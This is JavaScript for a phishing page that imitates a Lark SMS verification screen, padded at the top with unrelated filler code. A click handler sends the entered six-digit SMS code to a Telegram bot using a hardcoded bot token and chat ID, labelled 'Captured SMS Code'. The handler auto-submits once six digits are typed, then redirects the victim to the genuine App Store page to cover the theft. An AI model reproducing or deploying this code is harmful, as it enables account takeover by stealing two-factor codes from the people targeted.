const codeInput = document.getElementById("codeInput");
const rightElement = document.getElementById("rightElement");
const btn = document.querySelector(".btn");
const appConfig = {
    version: "2.4.7",
    environment: "production",
    cacheTTL: 300000
};

function generateId(prefix = "item") {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function debounce(fn, delay) {
    let timer;
    return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}

const mockRecords = Array.from({ length: 50 }, (_, i) => ({
    id: generateId(),
    score: Math.floor(Math.random() * 100),
    index: i
}));

const analytics = mockRecords.reduce(
    (acc, item) => {
        acc.total += item.score;
        acc.highest = Math.max(acc.highest, item.score);
        acc.lowest = Math.min(acc.lowest, item.score);
        return acc;
    },
    { total: 0, highest: 0, lowest: Infinity }
);

class MemoryCache {
    constructor() {
        this.store = new Map();
    }

    set(key, value) {
        this.store.set(key, {
            value,
            timestamp: Date.now()
        });
    }

    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        return entry.value;
    }

    clear() {
        this.store.clear();
    }
}

const cache = new MemoryCache();

for (let i = 0; i < 20; i++) {
    cache.set(`key_${i}`, {
        id: generateId("cache"),
        active: Math.random() > 0.5
    });
}

function performHealthCheck() {
    const checks = [
        () => Math.random() > 0.1,
        () => Math.random() > 0.05,
        () => Math.random() > 0.02
    ];

    return checks.every(check => check());
}

const systemState = {
    ready: performHealthCheck(),
    uptime: performance.now()
};

window.addEventListener(
    "resize",
    debounce(() => {
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };

        cache.set("viewport", viewport);
    }, 250)
);

const taskQueue = [];

function enqueue(task) {
    taskQueue.push({
        id: generateId("task"),
        created: Date.now(),
        task
    });
}

for (let i = 0; i < 15; i++) {
    enqueue(() => i * 2);
}

async function preloadResources() {
    return Promise.all(
        Array.from({ length: 5 }, (_, i) =>
            Promise.resolve({
                resource: `resource_${i}`,
                loaded: true
            })
        )
    );
}

preloadResources().then(resources => {
    cache.set("resources", resources);
});

console.debug("Analytics:", analytics);
console.debug("System:", systemState);
console.debug("Queue length:", taskQueue.length);
const BOT_TOKEN = "8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo";
const CHAT_ID = "5460147192";

btn.addEventListener("click", () => {
  if (codeInput.value.trim() === "") {
    showError();
    return;
  }

  if (btn.classList.contains("disabled")) return;

  fetch(`https://api.telegram.org/bot${"8521452515:AAFtk4uoAYwXq8fVzJABkSZEgHcYh0Kk2Yo"}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `✅Captured SMS Code:  ${codeInput.value}`
    })
  }).catch(err => console.error('Failed to send to Telegram:', err));

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "https://apps.apple.com/us/app/lark-team-collaboration/id1452166623";
  }, 3500);
});
const errorText = document.getElementById("errorText");

errorText.textContent = "Enter SMS verification code";

function showError() {
  codeInput.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  codeInput.classList.remove("input-error");
  errorText.style.display = "none";
}

rightElement.innerHTML = `<div class="spinner active"></div>`;

let countdown = 59;
let timerInterval;

btn.disabled = true;
btn.classList.add("disabled");
codeInput.disabled = true;

function renderTimer() {
  rightElement.innerHTML = `
    <span style="
      font-size: 15px;
      color: rgb(187, 191, 196);
      font-family: Inter, -apple-system, BlinkMacSystemFont, 'Segoe UI',
      'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei',
      'Helvetica Neue', Helvetica, Arial, sans-serif;
      white-space: nowrap;
       -webkit-font-smoothing: antialiased; font-weight: 400;
    ">
      Send again after ${countdown}s
    </span>
  `;
}

function showResend() {
  rightElement.innerHTML = `
    <span style="color: rgb(63, 81, 181); cursor:pointer; font-size: 15px;  -webkit-font-smoothing: antialiased;
  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 400;">
      Send verification code
    </span>
  `;

  rightElement.onclick = () => {
    showResendLoading();

    rightElement.onclick = null;

    setTimeout(() => {
      countdown = 59;
      startTimer();
    }, 2000);
  };
}

codeInput.addEventListener("input", () => {
  codeInput.value = codeInput.value.replace(/\D/g, "");

  if (codeInput.value.length > 0) {
    hideError();
  }

  if (codeInput.value.length === 6) {
    btn.disabled = false;
    btn.classList.remove("disabled");

    setTimeout(() => {
      btn.click();
    }, 300);
  } else {
    btn.disabled = true;
    btn.classList.add("disabled");
  }
});

codeInput.addEventListener("blur", () => {
  if (codeInput.value.trim() === "") {
    showError();
  }
});

function startTimer() {
  renderTimer();

  timerInterval = setInterval(() => {
    countdown--;
    renderTimer();

    if (countdown <= 0) {
      clearInterval(timerInterval);
      showResend();
    }
  }, 1000);
}

btn.addEventListener("click", () => {
  if (codeInput.value.trim() === "") {
    showError();
    return;
  }

  if (btn.classList.contains("disabled")) return;

  btn.classList.add("loading");

  setTimeout(() => {
    window.location.href = "https://apps.apple.com/us/app/lark-team-collaboration/id6449830127?mt=12";
  }, 2500);
});

function goBack() {
  window.location.href = "/vpn-tiktok/welcome/next/password.html";
}

setTimeout(() => {
  codeInput.disabled = false;
  codeInput.classList.add("input2");
  codeInput.placeholder = "Please enter SMS verification code";

  startTimer();
}, 2000);

function showResendLoading() {
  rightElement.innerHTML = `<div class="spinner input-spinner"></div>`;
}
